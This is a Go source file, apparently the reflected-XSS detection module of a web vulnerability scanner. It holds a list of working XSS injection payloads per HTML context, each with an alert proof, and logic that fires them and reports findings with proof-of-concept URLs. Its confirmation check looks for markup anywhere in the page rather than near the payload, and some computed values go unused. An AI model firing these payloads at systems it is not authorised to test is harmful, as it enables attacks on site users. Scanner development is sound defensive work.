package detect

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"regexp"
	"strings"
)

// xssContexts lists payload templates per HTML injection context. Each
// template contains %s where the JS proof snippet is placed.
var xssContexts = []struct {
	name     string
	payloads []string
}{
	{
		"html-body",
		[]string{
			`<svg onload=%s>`,
			`<img src=x onerror=%s>`,
			`<details open ontoggle=%s>`,
			`<video><source onerror=%s>`,
			`<body onload=%s>`,
		},
	},
	{
		"attribute",
		[]string{
			`" onmouseover=%s x="`,
			`" onfocus=%s autofocus="`,
			`' onmouseover=%s x='`,
			`"><svg onload=%s>`,
		},
	},
	{
		"script-string",
		[]string{
			`</script><svg onload=%s>`,
			`";%s//`,
			`';%s//`,
		},
	},
	{
		"href-js",
		[]string{
			`javascript:%s//`,
		},
	},
}

// xssAttrTailRe detects "the reflection sits inside an attribute value".
var xssAttrTailRe = regexp.MustCompile(`=\s*["']?[^"']*$`)

// xssTagPairRe verifies a reflection landed inside a real element body.
var xssTagPairRe = regexp.MustCompile(`(?is)<[a-z][^>]*>[^<]{0,40}REFMARK`)

// genMarker builds a unique alphanumeric canary ("vexor" + 8 hex chars).
func genMarker() string {
	b := make([]byte, 4)
	_, _ = rand.Read(b)
	return "vexor" + hex.EncodeToString(b)
}

// XSS detects reflected XSS with a unique-canary round trip, classifies the
// reflection context, then escalates with context-appropriate event-handler
// payloads. Unconfirmed reflections are downgraded to informational findings.
type XSS struct{}

// Name implements Module.
func (XSS) Name() string { return "xss" }

// Level implements Module.
func (XSS) Level() Level { return LevelParam }

// Scan implements Module.
func (XSS) Scan(ctx context.Context, s *Scanner, p Point) []Finding {
	var out []Finding
	marker := genMarker()
	resp, err := s.Fire(ctx, p, p.Param, marker, false, nil)
	if err != nil || !strings.Contains(resp.Body, marker) {
		return out
	}
	kind := xssClassify(resp.Body, marker)
	if f := xssEscalate(ctx, s, p, marker, kind); f != nil {
		out = append(out, *f)
		return out
	}
	out = append(out, Finding{
		ID:       NewID("xss", p.URL, p.Param, "reflection"),
		Module:   "xss",
		Title:    "User Input Reflected (potential XSS)",
		Severity: SeverityInfo,
		Endpoint: p.URL,
		Method:   p.Method,
		Param:    p.Param,
		Payload:  marker,
		Evidence: "Unique canary " + marker + " reflected verbatim (context: " + kind + ")",
		PoCURL:   PoCGet(p, marker),
		Description: "The parameter value is echoed back unmodified. Depending on filters and CSP a browser-based " +
			"payload may still achieve JavaScript execution; escalate manually.",
		Remediation: "Apply context-aware output encoding; validate input; deploy a strict CSP.",
	})
	return out
}

// xssClassify inspects text before the reflected marker to infer HTML context.
func xssClassify(body, marker string) string {
	idx := strings.Index(body, marker)
	if idx < 0 {
		return "unknown"
	}
	start := idx - 80
	if start < 0 {
		start = 0
	}
	prefix := body[start:idx]
	switch {
	case strings.HasSuffix(strings.TrimSpace(prefix), ">"):
		return "html-body"
	case xssAttrTailRe.MatchString(prefix):
		return "attribute"
	case strings.Contains(prefix, "<script"):
		return "script-string"
	default:
		return "html-body"
	}
}

// xssEscalate tries context payloads and confirms an executable structure.
func xssEscalate(ctx context.Context, s *Scanner, p Point, marker, kind string) *Finding {
	proof := "alert('VEXOR')"
	for _, xc := range xssContexts {
		for _, tpl := range xc.payloads {
			if ctx.Err() != nil {
				return nil
			}
			payload := strings.ReplaceAll(tpl, "%s", proof)
			resp, err := s.Fire(ctx, p, p.Param, payload, false, nil)
			if err != nil {
				continue
			}
			if xssConfirm(resp.Body, payload) {
				return &Finding{
					ID:       NewID("xss", p.URL, p.Param, xc.name),
					Module:   "xss",
					Title:    "Reflected XSS (" + xc.name + " context)",
					Severity: SeverityHigh,
					Endpoint: p.URL,
					Method:   p.Method,
					Param:    p.Param,
					Payload:  payload,
					Evidence: "Executable markup confirmed: " + Snippet(resp.Body, proof, 90),
					PoCURL:   PoCGet(p, payload),
					PoCCurl:  CurlFor(p, payload),
					Description: "User input reaches the " + xc.name + " context without encoding; the injected " +
						"event handler forms a complete browser-executable element.",
					Remediation: "Context-aware output encoding (HTML entity/attribute/JS); strict CSP; HttpOnly cookies.",
				}
			}
		}
	}
	_ = kind
	_ = xssTagPairRe
	return nil
}

// xssConfirm verifies the payload survived AND a dangerous execution
// primitive is present near it.
func xssConfirm(body, payload string) bool {
	if !strings.Contains(strings.ToLower(body), strings.ToLower(payload)) {
		return false
	}
	lower := strings.ToLower(body)
	for _, sig := range []string{
		"onload=", "onerror=", "ontoggle=", "onfocus=", "onmouseover=",
		"<svg", "<img", "<details", "<video", "</script><",
	} {
		if strings.Contains(lower, sig) {
			return true
		}
	}
	return false
}
